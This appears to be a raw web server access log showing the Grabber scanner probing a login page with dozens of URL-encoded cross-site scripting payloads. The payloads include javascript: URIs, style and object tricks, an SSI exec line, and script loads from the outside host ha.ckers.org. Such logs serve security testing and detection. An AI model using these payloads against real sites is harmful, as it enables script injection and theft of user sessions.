172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E&user_token=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E&Login=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E&password=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CBODY+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E&user_token=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E&Login=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E&password=%3CXML+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxsstest.xml%22+ID%3DI%3E%3C%2FXML%3E+%3CSPAN+DATASRC%3D%23I+DATAFLD%3DC+DATAFORMATAS%3DHTML%3E%3C%2FSPAN%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E&user_token=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E&Login=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E&password=%3COBJECT+classid%3Dclsid%3Aae24fdae-03c6-11d1-8b76-0080c744f389%3E%3Cparam+name%3Durl+value%3Djavascript%3Aalert%28%27XSS%27%29%3E%3C%2FOBJECT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B&user_token=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B&Login=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B&password=a%3D%22get%22%3B%26%2310%3Bb%3D%22URL%28%22%22%3B%26%2310%3Bc%3D%22javascript%3A%22%3B%26%2310%3Bd%3D%22alert%28%27XSS%27%29%3B%22%29%22%3B+eval%28a%2Bb%2Bc%2Bd%29%3B& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E&user_token=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E&Login=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E&password=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&user_token=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&Login=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E&password=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E&user_token=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E&Login=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E&password=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22http%3A%2F%2Fgoogle%3Aha.ckers.org%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:00 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E&user_token=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E&Login=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E&password=%3CA+HREF%3D%22http%3A%2F%2F1113982867%2F%22%3EXSS%3C%2FA%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&user_token=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&Login=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&password=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS&user_token=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS&Login=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS&password=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=See+Below&user_token=See+Below&Login=See+Below&password=See+Below& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E&user_token=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E&Login=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E&password=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D&user_token=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D&Login=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D&password=%27%27%3B%21--%22%3CXSS%3E%3D%26%7B%28%29%7D& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E&user_token=%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E&Login=%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E&password=%3CBODY+ONLOAD%3Dalert%28%27XSS%27%29%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&user_token=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&Login=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&password=%3CSCRIPT+a%3D%60%3E%60+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&user_token=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&Login=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&password=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&user_token=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&Login=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&password=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&user_token=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&Login=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&password=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E&user_token=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E&Login=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E&password=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E&user_token=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E&Login=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E&password=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&user_token=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&Login=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E&password=%3CSCRIPT+a%3D%22%3E%27%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E&user_token=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E&Login=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E&password=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E&user_token=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E&Login=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E&password=%3CTABLE+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTABLE%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E&user_token=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E&Login=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E&password=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /?username=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js&user_token=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js&Login=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js&password=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js& HTTP/1.1" 302 300 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
172.17.0.1 - - [12/Feb/2019:08:22:01 +0000] "GET /login.php HTTP/1.1" 200 1814 "http://google.com/?q=grabber" "Grabber/0.1 (X11; U; Linux i686; en-US; rv:1.7)"
